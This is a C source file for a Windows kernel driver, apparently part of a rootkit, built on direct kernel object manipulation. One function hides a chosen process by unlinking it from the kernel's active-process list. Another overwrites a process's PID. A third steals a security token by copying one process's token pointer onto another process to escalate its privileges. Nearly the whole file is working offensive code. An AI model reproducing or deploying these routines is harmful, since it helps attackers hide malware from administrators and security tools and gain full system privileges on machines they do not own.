/*
 * dkom.c
 *
 * Description: Implements direct kernel object manipulation functions.
 *
 * Copyright 2024 Kyle Smith
 * Licensed under GPL-3.0-or-later
 */

#include "dkom.h"
#include "ioctl.h"

NTSTATUS proc_unlink(UINT32 pid)
{
        if (!pid) {
                DbgPrint(DRIVER_PREFIX "invalid PID for Hide: %d", pid);
                return STATUS_SUCCESS;
        }

        PEPROCESS curr_proc = PsGetCurrentProcess();

        PLIST_ENTRY curr_entry = (PLIST_ENTRY)((PUCHAR)curr_proc +
                PROC_LINKS_OFFSET);
        PLIST_ENTRY curr_flink = NULL;
        PLIST_ENTRY curr_blink = curr_entry->Blink;

        while (curr_entry != curr_blink) {
                curr_flink = curr_entry->Flink;
                PUINT32 curr_pid = (PUINT32)(((ULONG_PTR)curr_entry -
                        PROC_LINKS_OFFSET) + PID_OFFSET);

                if (*curr_pid == pid) {
                        if (MmIsAddressValid(curr_entry))
                                RemoveEntryList(curr_entry);

                        break;
                }
                curr_entry = curr_flink;
        }

        return STATUS_SUCCESS;
}

NTSTATUS proc_set_pid(UINT32 pid)
{
        if (!pid) {
                DbgPrint(DRIVER_PREFIX "invalid PID for Set");
                return STATUS_SUCCESS;
        }

        PEPROCESS curr_proc = PsGetCurrentProcess();

        PLIST_ENTRY curr_entry = (PLIST_ENTRY)((PUCHAR)curr_proc +
                PROC_LINKS_OFFSET);
        PLIST_ENTRY curr_flink = NULL;
        PLIST_ENTRY curr_blink = curr_entry->Blink;

        while (curr_entry != curr_blink) {
                curr_flink = curr_entry->Flink;
                PUINT32 curr_pid = (PUINT32)(((ULONG_PTR)curr_entry -
                        PROC_LINKS_OFFSET) + PID_OFFSET);

                if (*curr_pid == pid) {
                        if (MmIsAddressValid(curr_entry))
                                *curr_pid = 0x1337;

                        break;
                }
                curr_entry = curr_flink;
        }

        return STATUS_SUCCESS;
}

NTSTATUS proc_token_steal(UINT32 src, UINT32 dest) {
        if (!src) {
                DbgPrint(DRIVER_PREFIX "invalid PID for src");
                return STATUS_SUCCESS;
        }

        if (!dest) {
                DbgPrint(DRIVER_PREFIX "invalid PID for dest");
                return STATUS_SUCCESS;
        }

        PEPROCESS src_proc = PsGetCurrentProcess();

        PLIST_ENTRY src_entry = (PLIST_ENTRY)((PUCHAR)src_proc +
                PROC_LINKS_OFFSET);
        PLIST_ENTRY src_flink = NULL;
        PLIST_ENTRY src_blink = src_entry->Blink;

        while (src_entry != src_blink) {
                src_flink = src_entry->Flink;
                PUINT32 src_pid = (PUINT32)(((ULONG_PTR)src_entry -
                        PROC_LINKS_OFFSET) + PID_OFFSET);

                if (*src_pid == src)
                        break;

                src_entry = src_flink;
        }

        PEPROCESS dest_proc = PsGetCurrentProcess();

        PLIST_ENTRY dest_entry = (PLIST_ENTRY)((PUCHAR)dest_proc +
                PROC_LINKS_OFFSET);
        PLIST_ENTRY dest_flink = NULL;
        PLIST_ENTRY dest_blink = dest_entry->Blink;

        while (dest_entry != dest_blink) {
                dest_flink = dest_entry->Flink;
                PUINT32 dest_pid = (PUINT32)(((ULONG_PTR)dest_entry -
                        PROC_LINKS_OFFSET) + PID_OFFSET);

                if (*dest_pid == dest)
                        break;

                dest_entry = dest_flink;
        }

        PUINT64 src_token = (PUINT64)(((ULONG_PTR)src_entry - 
                PROC_LINKS_OFFSET) + TOKEN_OFFSET);
        PUINT64 dest_token = (PUINT64)(((ULONG_PTR)dest_entry -
                PROC_LINKS_OFFSET) + TOKEN_OFFSET);

        DbgPrint(DRIVER_PREFIX "src token: 0x%11X\n", *src_token);
        DbgPrint(DRIVER_PREFIX "dest token: 0x%11X\n", *dest_token);

        *dest_token = *src_token;

        DbgPrint(DRIVER_PREFIX "dest token modified: 0x%11X\n", *dest_token);

        return STATUS_SUCCESS;
}
